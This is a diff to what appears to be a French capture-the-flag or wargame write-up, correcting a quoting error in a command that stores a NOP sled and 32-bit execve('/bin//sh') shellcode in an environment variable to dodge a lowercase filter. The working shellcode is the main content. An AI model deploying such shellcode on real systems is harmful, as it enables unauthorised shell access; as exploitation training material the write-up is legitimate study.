@@ -17,7 +17,7 @@
    ```
 2. On va utiliser une variable d'environnement pour stocker le shellcode afin d'eviter son alteration par le `to_lowercase`.
    ```
-   export SHELLCODE=`python -c 'print "\x90" * 128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"`
+   export SHELLCODE=`python -c 'print "\x90" * 128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'`
 
    gcc -m32 /tmp/addr.c -o /tmp/addr
 
